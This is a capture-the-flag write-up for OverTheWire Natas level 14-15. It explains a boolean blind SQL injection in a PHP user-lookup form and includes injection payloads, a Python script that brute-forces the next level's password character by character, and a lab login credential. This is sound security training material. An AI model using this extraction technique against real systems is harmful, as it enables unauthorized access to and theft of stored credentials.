# Natas OverTheWire level 14-15

## Objective

Retrieve the password for the next level

---

## Vulnerability Analysis

In the source code we see that out input is directly concatenated into an SQL query:

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

When a username is submitted, the application executes a query similar to:

    SELECT * from users where username="INPUT"

Because the input is inserted directly into the query without sanitization or prepared statements, the application is vulnerable to SQL injection

In this case we see the application only returns one or two messages

    This user exists

or
    
    This user doesn't exists


This means the vulnerability is a Boolean Blind SQL injection

The application can be used as a true/flase machine that can answer questions about data in the database

---

## Exploitation Process

In this case the source code included a debug option:

    if(array_key_exists("debug", $_GET)) { echo "Executing query: $query<br>"; }

So we add ?debug=1 in the URL to display the final SQL query being executed

As we know this application did not reveal any data...

This meant the attack had focus on extracting info through true/false conditions


The target username was "natas16"

we tried a condition such as:

    natas16" AND password="a" #

and we see:

    SELECT * from users where username="natas16" AND password="a" #"

And this returned:

    This user doesn't exist.

This only meant that the password was not equal to "a" but we were building the payload 


At this moment we decided to use SUBSTRING() the SQL function

    SUBSTRING(password,1,1)="" #

this way we can ask by a string in a determinated position for its existence

Tried some times manually and decided to create a Python script to automate the process

    import requests

    url = "http://natas15.natas.labs.overthewire.org/"
    auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    password = ""

    for pos in range(1, 33):

        for c in charset:

            payload = f'natas16" AND BINARY SUBSTRING(password,{pos},1)="{c}" #'

            r = requests.post(url, auth=auth, data={"username": payload})

            if "This user exists" in r.text:
                password += c
                print(password)
                break

    print("Final password:", password)


- This script iterates through every position in the password (32 characters)
- Test all the possible alphanumeric characters 
- Detects every character through the application's response 
- Builds the password one character at a time forcing case-sensitive comparisions

We ran the script, and eventually, we got the password


---

## Observations and Findings

- SQL injection remains exploitable even when query results are not displayed

- Boolean-based responses can leak sensitive information

---

## key Concepts Learned

- SQLi
- Boolean-based Blind SQLi
- SQL SUBSTRING() function
- Database enumeration
- Python automation with requests
- Case-sensitive comparisions with BINARY





